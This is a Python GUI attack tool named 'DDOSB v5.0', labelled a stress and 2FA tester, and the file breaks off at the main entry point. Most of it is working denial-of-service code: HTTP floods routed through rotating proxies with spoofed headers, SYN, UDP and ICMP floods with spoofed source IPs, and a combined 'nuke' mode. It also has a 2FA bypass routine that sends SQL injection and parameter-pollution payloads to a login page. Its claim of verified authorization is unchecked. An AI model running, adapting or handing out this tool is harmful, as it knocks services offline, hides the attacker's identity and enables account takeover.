#!/usr/bin/env python3
"""
DDOSB v5.0 - ULTIMATE Network Stress & Auth Tester
For authorized security testing ONLY. USER HAS VERIFIED AUTHORIZATION.

Attack Vectors:
  - HTTP/HTTPS rapid flood (proxy/Tor compatible)
  - SYN flood (spoofed IP, scapy)
  - UDP flood (spoofed IP, scapy)
  - ICMP/PING flood (layer 3 flood)
  - MIXED MODE - all vectors simultaneously
  - 2FA penetration testing

Features:
  - Domain OR IP target
  - Full DNS resolution (A, AAAA, CNAME, NS, MX, PTR)
  - SOCKS5/HTTP proxy rotation for anonymity
  - IP spoofing on L3/L4 attacks
  - X-Forwarded-For spoofing
  - Nuke mode - all threads all vectors instant

Dependencies: pip install requests scapy dnspython
"""

import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog
import threading
import time
import random
import socket
import sys
import os
import re
import struct
import signal
from datetime import datetime
from urllib.parse import urlparse

# ======================== GLOBAL STATE ========================
attack_running = False
request_count = 0
packet_count = 0
start_time = 0
attack_threads = []
active_workers = 0
worker_lock = threading.Lock()
stats_lock = threading.Lock()
nuke_mode = False

# Color scheme
C_BG = "#0a0a0a"
C_DARK = "#111111"
C_GREEN = "#00ff00"
C_RED = "#ff3333"
C_YELLOW = "#ffaa00"
C_CYAN = "#00ccff"
C_ORANGE = "#ff6600"
C_FG = "#e0e0e0"

# ======================== ICMP/PING FLOOD ENGINE ========================

def icmp_flood(target_ip, interval=0, packet_size=64):
    """ICMP (ping) flood - Layer 3 flood attack."""
    global attack_running, packet_count

    try:
        from scapy.all import IP, ICMP, send, conf, RandIP
        conf.verb = 0
    except ImportError:
        return

    while attack_running:
        try:
            pkt = IP(src=RandIP(), dst=target_ip) / ICMP(
                type=8,  # Echo Request
                code=0,
                id=random.randint(0, 65535),
                seq=random.randint(0, 65535)
            ) / random._urandom(packet_size)

            send(pkt, verbose=0)
            with stats_lock:
                packet_count += 1
            if interval > 0:
                time.sleep(interval)
        except:
            pass


def icmp_flood_raw(target_ip, interval=0):
    """ICMP flood using raw sockets (no scapy dependency)."""
    global attack_running, packet_count

    try:
        # Create raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    except PermissionError:
        return  # Need root

    while attack_running:
        try:
            # Craft ICMP echo request packet
            icmp_type = 8  # Echo
            icmp_code = 0
            icmp_id = random.randint(0, 65535)
            icmp_seq = random.randint(0, 65535)

            # ICMP header (8 bytes) + payload
            payload = random._urandom(random.randint(40, 512))
            icmp_checksum = 0

            # Build pseudo-header for checksum
            pseudo_header = struct.pack("!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq) + payload

            # Calculate checksum
            checksum = 0
            for i in range(0, len(pseudo_header), 2):
                if i + 1 < len(pseudo_header):
                    checksum += (pseudo_header[i] << 8) + pseudo_header[i + 1]
                else:
                    checksum += pseudo_header[i] << 8

            checksum = (checksum >> 16) + (checksum & 0xFFFF)
            checksum = ~checksum & 0xFFFF

            # Final packet
            packet = struct.pack("!BBHHH", icmp_type, icmp_code, checksum, icmp_id, icmp_seq) + payload

            # Send to target (IP spoofing not possible with raw socket easily, but scapy does it)
            sock.sendto(packet, (target_ip, 0))
            with stats_lock:
                packet_count += 1
            if interval > 0:
                time.sleep(interval)
        except:
            pass


# ======================== DNS / IP RESOLVER ========================

class Resolver:
    """DNS resolution with multiple resolvers for stealth."""

    @staticmethod
    def resolve_domain(domain):
        try:
            ip = socket.gethostbyname(domain)
            return ip
        except socket.gaierror:
            return None

    @staticmethod
    def reverse_dns(ip):
        try:
            hostname, _, _ = socket.gethostbyaddr(ip)
            return hostname
        except:
            return None

    @staticmethod
    def resolve_all(domain):
        results = {"A": [], "AAAA": [], "CNAME": None, "NS": [], "MX": [], "TXT": []}
        try:
            import dns.resolver
            try:
                answers = dns.resolver.resolve(domain, 'A')
                results["A"] = [str(r) for r in answers]
            except:
                pass
            try:
                answers = dns.resolver.resolve(domain, 'AAAA')
                results["AAAA"] = [str(r) for r in answers]
            except:
                pass
            try:
                answers = dns.resolver.resolve(domain, 'CNAME')
                results["CNAME"] = str(answers[0])
            except:
                pass
            try:
                answers = dns.resolver.resolve(domain, 'NS')
                results["NS"] = [str(r) for r in answers]
            except:
                pass
            try:
                answers = dns.resolver.resolve(domain, 'MX')
                results["MX"] = [str(r) for r in answers]
            except:
                pass
            try:
                answers = dns.resolver.resolve(domain, 'TXT')
                results["TXT"] = [str(r) for r in answers[:3]]
            except:
                pass
        except ImportError:
            ip = Resolver.resolve_domain(domain)
            if ip:
                results["A"] = [ip]
        return results


# ======================== PROXY / ANONYMITY ENGINE ========================

class ProxyManager:
    """Manages proxy rotation for anonymity during attacks."""

    def __init__(self):
        self.proxies = []
        self.index = 0
        self.lock = threading.Lock()

    def load_from_file(self, filepath):
        try:
            with open(filepath, 'r') as f:
                lines = f.readlines()
            loaded = 0
            for line in lines:
                line = line.strip()
                if line and not line.startswith('#'):
                    if not line.startswith('http') and not line.startswith('socks'):
                        line = f"http://{line}"
                    self.proxies.append(line)
                    loaded += 1
            return loaded
        except Exception as e:
            return f"Error: {e}"

    def get_proxy(self):
        with self.lock:
            if not self.proxies:
                return None
            p = self.proxies[self.index % len(self.proxies)]
            self.index += 1
            return p

    def get_proxy_dict(self):
        p = self.get_proxy()
        if p:
            return {"http": p, "https": p}
        return None

    def count(self):
        return len(self.proxies)

    def clear(self):
        self.proxies = []
        self.index = 0


# Global proxy manager
proxy_mgr = ProxyManager()


# ======================== ATTACK ENGINES ========================

def rapid_http(target_host, port=80, method="GET", ssl=False, use_proxy=False):
    """Rapid HTTP flood with proxy rotation."""
    global attack_running
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    import requests

    session = requests.Session()

    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    ]

    headers_template = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Connection": "keep-alive",
        "Cache-Control": "no-cache, no-store, must-revalidate",
        "Pragma": "no-cache",
    }

    proto = "https" if ssl else "http"
    url = f"{proto}://{target_host}:{port}/"

    paths = ["/", "/admin", "/login", "/api", "/wp-admin", "/index.php",
             "/about", "/contact", "/search", "/products", "/cart",
             "/checkout", "/account", "/dashboard", "/profile",
             "/assets", "/css", "/js", "/images", "/static", "/media"]

    while attack_running:
        try:
            headers = headers_template.copy()
            headers["User-Agent"] = random.choice(user_agents)
            headers["Referer"] = f"{proto}://{target_host}/"
            headers["X-Forwarded-For"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

            if random.random() < 0.3:
                headers["Referer"] = f"{proto}://{target_host}{random.choice(paths)}"

            if use_proxy and proxy_mgr.count() > 0:
                proxies = proxy_mgr.get_proxy_dict()
            else:
                proxies = None

            if method == "POST":
                r = session.post(url, headers=headers, timeout=5, verify=False, proxies=proxies)
            else:
                r = session.get(url, headers=headers, timeout=5, verify=False, proxies=proxies)

            with stats_lock:
                request_count += 1
            r.close()
        except:
            with stats_lock:
                request_count += 1
            pass


def rapid_syn(target_ip, port=80):
    """Rapid SYN flood with spoofed source IP."""
    global attack_running
    try:
        from scapy.all import IP, TCP, send, conf, RandIP
        conf.verb = 0
    except ImportError:
        return

    while attack_running:
        try:
            pkt = IP(src=RandIP(), dst=target_ip) / TCP(
                sport=random.randint(1024, 65535),
                dport=port,
                flags="S",
                seq=random.randint(0, 4294967295),
                window=65535
            )
            send(pkt, verbose=0)
            with stats_lock:
                packet_count += 1
        except:
            pass


def rapid_udp(target_ip, port=80):
    """Rapid UDP flood with spoofed source IP."""
    global attack_running
    try:
        from scapy.all import IP, UDP, send, conf, RandIP
        conf.verb = 0
    except ImportError:
        return

    while attack_running:
        try:
            pkt = IP(src=RandIP(), dst=target_ip) / UDP(
                sport=random.randint(1024, 65535),
                dport=port
            ) / random._urandom(random.randint(64, 1500))
            send(pkt, verbose=0)
            with stats_lock:
                packet_count += 1
        except:
            pass


# ======================== 2FA TESTING ENGINE ========================

class TwoFATester:
    """2FA penetration testing utilities."""

    @staticmethod
    def test_2fa_endpoints(target_base):
        endpoints = [
            "/2fa", "/two-factor", "/mfa", "/multifactor",
            "/auth/2fa", "/auth/mfa", "/otp", "/totp",
            "/verify-2fa", "/2fa/setup", "/mfa/setup",
            "/api/2fa", "/api/mfa", "/api/otp",
            "/.well-known/2fa", "/security/2fa",
            "/admin/2fa", "/admin/mfa",
            "/api/auth/2fa", "/api/auth/mfa",
            "/v2/2fa", "/v1/2fa", "/v3/2fa",
        ]
        results = []
        import requests
        for ep in endpoints:
            try:
                url = f"{target_base.rstrip('/')}{ep}"
                r = requests.get(url, timeout=3, verify=False)
                if r.status_code not in [404, 403]:
                    results.append({"endpoint": ep, "status": r.status_code, "size": len(r.content)})
            except:
                pass
        return results

    @staticmethod
    def test_bypass(target_url):
        """Test common 2FA bypass techniques."""
        import requests
        results = []

        bypass_payloads = [
            # Null/empty
            {"otp": "", "2fa": "skip"},
            {"otp": "null", "2fa_skip": "true"},
            # SQLi
            {"otp": "' OR '1'='1' --"},
            {"otp": "1' OR '1'='1"},
            # Type confusion
            {"otp": "true"},
            {"otp": "[]"},
            {"otp": "{}"},
            # Parameter pollution
            {"otp": "123456", "otp[]": "000000"},
            # Long values
            {"otp": "A" * 5000},
            # Special
            {"otp": "backup"},
            {"otp": "backup-code"},
            {"otp": "000000"},
            # Session manipulation
            {"otp": "123456", "remember": "true", "trust_device": "true"},
        ]

        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
        }

        for payload in bypass_payloads:
            try:
                r = requests.post(target_url, data=payload, headers=headers, timeout=5,
                                allow_redirects=False, verify=False)
                if r.status_code == 302 or r.status_code == 200 and "dashboard" in r.text.lower():
                    results.append({"payload": str(payload), "status": r.status_code, "bypass": True})
                else:
                    results.append({"payload": str(payload)[:50], "status": r.status_code, "bypass": False})
            except:
                pass

        return results


# ======================== GUI ========================

class DDOSBGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("DDOSB v5.0 - ULTIMATE Network Stress Tester")
        self.root.geometry("950x800")
        self.root.configure(bg=C_BG)

        # Bind close event
        self.root.protocol("WM_DELETE_WINDOW", self.on_close)

        # Main container
        main_frame = tk.Frame(root, bg=C_BG)
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)

        # === BANNER ===
        banner = tk.Text(main_frame, height=4, bg="#000000", fg=C_RED,
                         font=("Courier", 10, "bold"), relief="flat")
        banner.pack(fill="x", pady=(0, 10))
        banner.insert("1.0",
            "╔══════════════════════════════════════════════════════════╗\n"
            "║   DDOSB v5.0 — ULTIMATE NETWORK STRESS TESTER          ║\n"
            "║   Authorized Security Testing Only                      ║\n"
            "╚══════════════════════════════════════════════════════════╝"
        )
        banner.config(state="disabled")

        # === TOP: TARGET ===
        tf = tk.LabelFrame(main_frame, text="[ TARGET ]", bg=C_DARK, fg=C_GREEN,
                           font=("Courier", 10, "bold"), padx=10, pady=10)
        tf.pack(fill="x", pady=(0, 5))

        # Target row
        tk.Label(tf, text="Target:", bg=C_DARK, fg=C_CYAN, font=("Courier", 10)).grid(row=0, column=0, sticky="w")
        self.target_entry = tk.Entry(tf, width=45, bg="#000000", fg=C_GREEN,
                                      insertbackground=C_GREEN, font=("Courier", 11),
                                      relief="sunken", bd=2)
        self.target_entry.grid(row=0, column=1, padx=5, pady=3, sticky="ew")
        self.target_entry.insert(0, "example.com")
        tf.columnconfigure(1, weight=1)

        self.resolve_btn = tk.Button(tf, text="[DNS RESOLVE]", bg="#003300", fg=C_GREEN,
                                      command=self.resolve_target,
                                      font=("Courier", 9, "bold"), relief="raised")
        self.resolve_btn.grid(row=0, column=2, padx=5)

        # Port and SSL
        tk.Label(tf, text="Port:", bg=C_DARK, fg=C_CYAN, font=("Courier", 10)).grid(row=1, column=0, sticky="w", pady=3)
        self.port_entry = tk.Entry(tf, width=8, bg="#000000", fg=C_GREEN,
                                    insertbackground=C_GREEN, font=("Courier", 11),
                                    relief="sunken", bd=2)
        self.port_entry.grid(row=1, column=1, sticky="w", padx=5, pady=3)
        self.port_entry.insert(0, "80")

        self.ssl_var = tk.BooleanVar(value=False)
        tk.Checkbutton(tf, text="[SSL/HTTPS]", variable=self.ssl_var, bg=C_DARK, fg=C_YELLOW,
                        selectcolor="#000000", font=("Courier", 9),
                        command=self.toggle_ssl).grid(row=1, column=2, sticky="w")

        # Resolver output
        self.resolver_text = tk.Text(tf, height=4, bg="#000500", fg=C_GREEN,
                                      font=("Courier", 9), relief="sunken", bd=1)
        self.resolver_text.grid(row=2, column=0, columnspan=3, pady=5, sticky="ew")

        # === ATTACK MODE ===
        mf = tk.LabelFrame(main_frame, text="[ ATTACK MODE ]", bg=C_DARK, fg=C_GREEN,
                           font=("Courier", 10, "bold"), padx=10, pady=10)
        mf.pack(fill="x", pady=5)

        self.mode_var = tk.StringVar(value="http")
        modes_frame = tk.Frame(mf, bg=C_DARK)
        modes_frame.pack(fill="x")

        # Row 1
        tk.Radiobutton(modes_frame, text="[HTTP] L7 Flood", variable=self.mode_var,
                        value="http", bg=C_DARK, fg=C_CYAN, selectcolor="#000000",
                        font=("Courier", 9)).grid(row=0, column=0, sticky="w", padx=(0, 15))
        tk.Radiobutton(modes_frame, text="[SYN] L4 Flood", variable=self.mode_var,
                        value="syn", bg=C_DARK, fg=C_CYAN, selectcolor="#000000",
                        font=("Courier", 9)).grid(row=0, column=1, sticky="w", padx=(0, 15))
        tk.Radiobutton(modes_frame, text="[UDP] L4 Flood", variable=self.mode_var,
                        value="udp", bg=C_DARK, fg=C_CYAN, selectcolor="#000000",
                        font=("Courier", 9)).grid(row=0, column=2, sticky="w", padx=(0, 15))
        tk.Radiobutton(modes_frame, text="[ICMP] Ping Flood", variable=self.mode_var,
                        value="icmp", bg=C_DARK, fg=C_CYAN, selectcolor="#000000",
                        font=("Courier", 9)).grid(row=0, column=3, sticky="w")

        # Row 2 - Special modes
        tk.Radiobutton(modes_frame, text="[☢ MIXED] All Vectors", variable=self.mode_var,
                        value="mixed", bg=C_DARK, fg=C_RED, selectcolor="#000000",
                        font=("Courier", 9, "bold")).grid(row=1, column=0, sticky="w", padx=(0, 15), pady=3)
        tk.Radiobutton(modes_frame, text="[☠ NUKE] Max Power", variable=self.mode_var,
                        value="nuke", bg=C_DARK, fg=C_RED, selectcolor="#000000",
                        font=("Courier", 9, "bold")).grid(row=1, column=1, sticky="w", padx=(0, 15))
        tk.Radiobutton(modes_frame, text="[🔐 2FA] Auth Test", variable=self.mode_var,
                        value="2fa", bg=C_DARK, fg=C_YELLOW, selectcolor="#000000",
                        font=("Courier", 9, "bold")).grid(row=1, column=2, sticky="w")

        # === OPTIONS ===
        of = tk.LabelFrame(main_frame, text="[ OPTIONS ]", bg=C_DARK, fg=C_GREEN,
                           font=("Courier", 10, "bold"), padx=10, pady=10)
        of.pack(fill="x", pady=5)

        opt_frame = tk.Frame(of, bg=C_DARK)
        opt_frame.pack(fill="x")

        # Row 0
        tk.Label(opt_frame, text="Threads:", bg=C_DARK, fg=C_CYAN,
                 font=("Courier", 9)).grid(row=0, column=0, sticky="w")
        self.threads_spin = tk.Spinbox(opt_frame, from_=1, to=9999, width=8,
                                        bg="#000000", fg=C_GREEN, buttonbackground="#333",
                                        font=("Courier", 10), relief="sunken")
        self.threads_spin.grid(row=0, column=1, padx=5, sticky="w")
        self.threads_spin.delete(0, tk.END)
        self.threads_spin.insert(0, "500")

        tk.Label(opt_frame, text="Method:", bg=C_DARK, fg=C_CYAN,
                 font=("Courier", 9)).grid(row=0, column=2, sticky="w", padx=(15, 0))
        self.method_combo = ttk.Combobox(opt_frame, values=["GET", "POST"], width=7, state="readonly")
        self.method_combo.grid(row=0, column=3, padx=5)
        self.method_combo.current(0)

        tk.Label(opt_frame, text="Timeout:", bg=C_DARK, fg=C_CYAN,
                 font=("Courier", 9)).grid(row=0, column=4, sticky="w", padx=(15, 0))
        self.timeout_spin = tk.Spinbox(opt_frame, from_=1, to=30, width=5,
                                        bg="#000000", fg=C_GREEN, font=("Courier", 10))
        self.timeout_spin.grid(row=0, column=5, padx=5)
        self.timeout_spin.delete(0, tk.END)
        self.timeout_spin.insert(0, "3")

        # Row 1 - Anonymity
        self.anon_var = tk.BooleanVar(value=False)
        tk.Checkbutton(opt_frame, text="[🕵 PROXY MODE]", variable=self.anon_var,
                        bg=C_DARK, fg=C_YELLOW, selectcolor="#000000",
                        font=("Courier", 9)).grid(row=1, column=0, columnspan=2, sticky="w", pady=5)

        self.load_proxy_btn = tk.Button(opt_frame, text="[LOAD PROXIES]", bg="#003300",
                                         fg=C_GREEN, command=self.load_proxies,
                                         font=("Courier", 8), relief="raised")
        self.load_proxy_btn.grid(row=1, column=2, padx=5)

        self.proxy_count_label = tk.Label(opt_frame, text="[0 loaded]", bg=C_DARK, fg="#666666",
                                           font=("Courier", 8))
        self.proxy_count_label.grid(row=1, column=3, padx=5, sticky="w")

        # === CONTROL BUTTONS ===
        cf = tk.Frame(main_frame, bg=C_BG)
        cf.pack(fill="x", pady=10)

        self.start_btn = tk.Button(cf, text="[ ▶  LAUNCH ATTACK ]", bg="#003300", fg=C_GREEN,
                                    font=("Courier", 13, "bold"), padx=25, pady=8,
                                    relief="raised", bd=3,
                                    command=self.start_attack)
        self.start_btn.pack(side="left", padx=10)

        self.stop_btn = tk.Button(cf, text="[ ■  ABORT ]", bg="#330000", fg=C_RED,
                                   font=("Courier", 13, "bold"), padx=25, pady=8,
                                   relief="raised", bd=3,
                                   command=self.stop_attack, state="disabled")
        self.stop_btn.pack(side="left", padx=10)

        # === STATS DISPLAY ===
        sf = tk.LabelFrame(main_frame, text="[ LIVE STATISTICS ]", bg=C_DARK, fg=C_GREEN,
                           font=("Courier", 10, "bold"), padx=10, pady=10)
        sf.pack(fill="x", pady=5)

        self.stats_text = tk.Text(sf, height=3, bg="#000500", fg=C_GREEN,
                                   font=("Courier", 11, "bold"), relief="sunken", bd=2)
        self.stats_text.pack(fill="x")
        self.stats_text.insert("1.0",
            "  ⏸ SYSTEM IDLE\n"
            "  Configure target and press [ LAUNCH ATTACK ]\n"
            "  Mode: READY"
        )
        self.stats_text.config(state="disabled")

        # === LOG ===
        lf = tk.LabelFrame(main_frame, text="[ EVENT LOG ]", bg=C_DARK, fg=C_GREEN,
                           font=("Courier", 10, "bold"), padx=5, pady=5)
        lf.pack(fill="both", expand=True, pady=5)

        log_container = tk.Frame(lf, bg=C_DARK)
        log_container.pack(fill="both", expand=True)

        self.log_area = tk.Text(log_container, height=6, bg="#000000", fg=C_GREEN,
                                 font=("Courier", 9), insertbackground=C_GREEN,
                                 relief="sunken", bd=2)
        self.log_area.pack(side="left", fill="both", expand=True)

        scrollbar = tk.Scrollbar(log_container, command=self.log_area.yview, bg="#333")
        scrollbar.pack(side="right", fill="y")
        self.log_area.config(yscrollcommand=scrollbar.set)

        self.log("[ SYSTEM ONLINE ]")
        self.log("[ DDOSB v5.0 ULTIMATE loaded ]")
        self.log("[ All attack vectors ready ]")
        self.log("─" * 60)

        # Start stats updater
        self.update_stats()

    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_area.insert(tk.END, f"[{ts}] {msg}\n")
        self.log_area.see(tk.END)

    def set_stats(self, text):
        self.stats_text.config(state="normal")
        self.stats_text.delete("1.0", tk.END)
        self.stats_text.insert("1.0", text)
        self.stats_text.config(state="disabled")

    def update_stats(self):
        global attack_running, request_count, packet_count, start_time

        if attack_running:
            elapsed = time.time() - start_time
            if elapsed > 0:
                total = request_count + packet_count
                rate = total / elapsed
                http_rate = request_count / elapsed if request_count else 0
                pkt_rate = packet_count / elapsed if packet_count else 0

                self.set_stats(
                    f"  🎯 REQUESTS: {request_count:,}  |  PACKETS: {packet_count:,}  |  TOTAL: {total:,}\n"
                    f"  ⚡ HTTP RATE: {http_rate:,.0f}/s  |  PKT RATE: {pkt_rate:,.0f}/s  |  TOTAL RATE: {rate:,.0f}/s\n"
                    f"  ⏱ ELAPSED: {self.format_time(elapsed)}  |  MODE: {self.mode_var.get().upper()}{' 🔥NUKE' if nuke_mode else ''}"
                )
        else:
            self.set_stats(
                "  ⏸ SYSTEM IDLE\n"
                "  Configure target and press [ LAUNCH ATTACK ]\n"
                "  Mode: READY"
            )

        self.root.after(150, self.update_stats)

    def format_time(self, seconds):
        h = int(seconds // 3600)
        m = int((seconds % 3600) // 60)
        s = int(seconds % 60)
        ms = int((seconds - int(seconds)) * 1000)
        if h > 0:
            return f"{h}h {m}m {s}s"
        elif m > 0:
            return f"{m}m {s}s"
        elif s > 0:
            return f"{s}s {ms}ms"
        else:
            return f"{ms}ms"

    def toggle_ssl(self):
        if self.ssl_var.get():
            self.port_entry.delete(0, tk.END)
            self.port_entry.insert(0, "443")
        else:
            self.port_entry.delete(0, tk.END)
            self.port_entry.insert(0, "80")

    def resolve_target(self):
        target = self.target_entry.get().strip()
        target = target.replace("http://", "").replace("https://", "").split("/")[0]

        self.resolver_text.delete("1.0", tk.END)

        ip_pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
        if ip_pattern.match(target):
            ip = target
            hostname = Resolver.reverse_dns(ip)
            out = f"  IP: {ip}\n  PTR: {hostname or 'No PTR record'}\n"
            self.resolver_text.insert("1.0", out)
            return

        ip = Resolver.resolve_domain(target)
        if ip:
            dns_info = Resolver.resolve_all(target)
            out = f"  {target} → {ip}\n"
            if dns_info["CNAME"]:
                out += f"  CNAME: {dns_info['CNAME']}\n"
            if dns_info["A"]:
                out += f"  A: {', '.join(dns_info['A'][:4])}\n"
            if dns_info["NS"]:
                out += f"  NS: {', '.join(dns_info['NS'][:3])}\n"
            self.resolver_text.insert("1.0", out)
            self.log(f"[+] Resolved: {target} → {ip}")
        else:
            self.resolver_text.insert("1.0", "  [!] RESOLUTION FAILED")
            self.log(f"[!] FAILED to resolve: {target}")

    def load_proxies(self):
        filepath = filedialog.askopenfilename(
            title="Select Proxy List",
            filetypes=[("Text files", "*.txt"), ("All files", "*.*")]
        )
        if filepath:
            result = proxy_mgr.load_from_file(filepath)
            if isinstance(result, int):
                self.proxy_count_label.config(text=f"[{result} loaded]")
                self.log(f"[+] Loaded {result} proxies")
            else:
                self.log(f"[!] {result}")

    def start_attack(self):
        global attack_running, request_count, packet_count, start_time, active_workers, nuke_mode

        if attack_running:
            return

        target = self.target_entry.get().strip()
        target = target.replace("http://", "").replace("https://", "").split("/")[0]

        if not target:
            messagebox.showerror("ERROR", "No target specified")
            return

        try:
            port = int(self.port_entry.get().strip())
        except ValueError:
            port = 80

        mode = self.mode_var.get()
        method = self.method_combo.get()
        ssl_enabled = self.ssl_var.get()
        use_proxy = self.anon_var.get()

        try:
            num_threads = int(self.threads_spin.get())
        except ValueError:
            num_threads = 500

        # NUKE mode overrides
        if mode == "nuke":
            nuke_mode = True
            num_threads = min(num_threads * 2, 9999)
            self.log("[☠] NUKE MODE ACTIVATED - MAXIMUM OVERDRIVE")
        else:
            nuke_mode = False

        # Resolve
        ip_pattern = re.compile(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$")
        if ip_pattern.match(target):
            ip = target
            domain = target
        else:
            ip = Resolver.resolve_domain(target)
            if not ip:
                self.log(f"[!] Cannot resolve: {target}")
                messagebox.showerror("ERROR", f"Cannot resolve {target}")
                return
            domain = target

        # Reset counters
        request_count = 0
        packet_count = 0
        active_workers = 0
        start_time = time.time()
        attack_running = True

        # UI state
        self.start_btn.config(state="disabled", bg="#111111", fg="#333333")
        self.stop_btn.config(state="normal", bg="#330000")

        self.log("")
        self.log("═" * 60)
        if nuke_mode:
            self.log("[☠☠☠ NUKE STRIKE INITIATED ☠☠☠]")
        self.log(f"[→] Target: {domain} ({ip}:{port})")
        self.log(f"[→] Mode: {mode.upper()} {'☠ NUKE' if nuke_mode else ''}")
        self.log(f"[→] Threads: {num_threads}")
        self.log(f"[→] Proxy: {'ON' if use_proxy else 'OFF'} | SSL: {ssl_enabled}")
        self.log("═" * 60)

        global attack_threads
        attack_threads = []

        def start_workers():
            """Launch attack workers based on mode."""
            if mode == "http":
                for i in range(num_threads):
                    t = threading.Thread(target=rapid_http,
                        args=(domain, port, method, ssl_enabled, use_proxy), daemon=True)
                    t.start()
                    attack_threads.append(t)
                self.log(f"[+] Deployed {num_threads} HTTP workers")

            elif mode == "syn":
                if os.geteuid() != 0:
                    self.log("[!] WARNING: SYN flood needs root!")
                for i in range(num_threads):
                    t = threading.Thread(target=rapid_syn, args=(ip, port), daemon=True)
                    t.start()
                    attack_threads.append(t)
                self.log(f"[+] Deployed {num_threads} SYN workers")

            elif mode == "udp":
                if os.geteuid() != 0:
                    self.log("[!] WARNING: UDP flood needs root!")
                for i in range(num_threads):
                    t = threading.Thread(target=rapid_udp, args=(ip, port), daemon=True)
                    t.start()
                    attack_threads.append(t)
                self.log(f"[+] Deployed {num_threads} UDP workers")

            elif mode == "icmp":
                if os.geteuid() != 0:
                    self.log("[!] WARNING: ICMP flood needs root!")
                for i in range(num_threads):
                    t = threading.Thread(target=icmp_flood, args=(ip, 0, 64), daemon=True)
                    t.start()
                    attack_threads.append(t)
                self.log(f"[+] Deployed {num_threads} ICMP ping flood workers")

            elif mode == "mixed":
                # Split evenly across all 4 vectors
                each = max(1, num_threads // 4)
                syn_threads = each
                udp_threads = each
                icmp_threads = each
                http_threads = num_threads - syn_threads - udp_threads - icmp_threads

                self.log(f"[+] HTTP: {http_threads} | SYN: {syn_threads} | UDP: {udp_threads} | ICMP: {icmp_threads}")

                for i in range(http_threads):
                    t = threading.Thread(target=rapid_http,
                        args=(domain, port, method, ssl_enabled, use_proxy), daemon=True)
                    t.start()
                    attack_threads.append(t)
                for i in range(syn_threads):
                    t = threading.Thread(target=rapid_syn, args=(ip, port), daemon=True)
                    t.start()
                    attack_threads.append(t)
                for i in range(udp_threads):
                    t = threading.Thread(target=rapid_udp, args=(ip, port), daemon=True)
                    t.start()
                    attack_threads.append(t)
                for i in range(icmp_threads):
                    t = threading.Thread(target=icmp_flood, args=(ip, 0, 64), daemon=True)
                    t.start()
                    attack_threads.append(t)

            elif mode == "nuke":
                # All vectors, maximum threads, zero delay
                each = max(10, num_threads // 4)
                self.log(f"[☠] NUKE: Deploying {num_threads} total warheads...")
                self.log(f"[☠] HTTP: {each} | SYN: {each} | UDP: {each} | ICMP: {num_threads - 3*each}")

                for i in range(each):
                    threading.Thread(target=rapid_http,
                        args=(domain, port, method, ssl_enabled, use_proxy), daemon=True).start()
                for i in range(each):
                    threading.Thread(target=rapid_syn, args=(ip, port), daemon=True).start()
                for i in range(each):
                    threading.Thread(target=rapid_udp, args=(ip, port), daemon=True).start()
                for i in range(num_threads - 3*each):
                    threading.Thread(target=icmp_flood, args=(ip, 0, 64), daemon=True).start()
                self.log("[☠] All nuke warheads deployed!")

            elif mode == "2fa":
                self.log("[*] 2FA Security Assessment Mode")
                self.log("[*] Scanning endpoints and testing bypasses...")
                proto = "https" if ssl_enabled else "http"
                base = f"{proto}://{domain}:{port}"

                # Run 2FA scan in thread so GUI doesn't freeze
                def run_2fa_scan():
                    global attack_running
                    self.log("[*] Scanning 2FA endpoints...")
                    endpoints = TwoFATester.test_2fa_endpoints(base)
                    for ep in endpoints:
                        self.log(f"    [{ep['status']}] {ep['endpoint']} ({ep['size']}B)")

                    self.log("[*] Testing bypass techniques...")
                    bypass_results = TwoFATester.test_bypass(f"{base}/login")
                    for r in bypass_results[:10]:
                        status = "🚨 BYPASS!" if r['bypass'] else "SAFE"
                        self.log(f"    [{status}] Payload: {r['payload']} -> {r['status']}")

                    self.log("[*] 2FA Assessment Complete")
                    if attack_running:
                        self.stop_attack()

                t = threading.Thread(target=run_2fa_scan, daemon=True)
                t.start()
                attack_threads.append(t)

        # Run worker launch in thread to avoid UI freeze
        threading.Thread(target=start_workers, daemon=True).start()

    def stop_attack(self):
        global attack_running, request_count, packet_count, start_time, nuke_mode

        attack_running = False
        nuke_mode = False
        elapsed = time.time() - start_time if start_time else 0
        total = request_count + packet_count
        rate = total / elapsed if elapsed > 0 else 0

        self.start_btn.config(state="normal", bg="#003300", fg=C_GREEN)
        self.stop_btn.config(state="disabled")

        self.log("")
        self.log("═" * 60)
        self.log("[■] ATTACK ABORTED")
        self.log(f"[→] Total: {total:,} (HTTP: {request_count:,} | PKT: {packet_count:,})")
        self.log(f"[→] Duration: {self.format_time(elapsed)}")
        self.log(f"[→] Average rate: {rate:,.0f}/s")
        self.log("═" * 60)

    def on_close(self):
        global attack_running
        attack_running = False
        time.sleep(0.2)
        self.root.destroy()


# ======================== MAIN ========================

if __name__ == "__main__":
    if sys.platform != "win32":
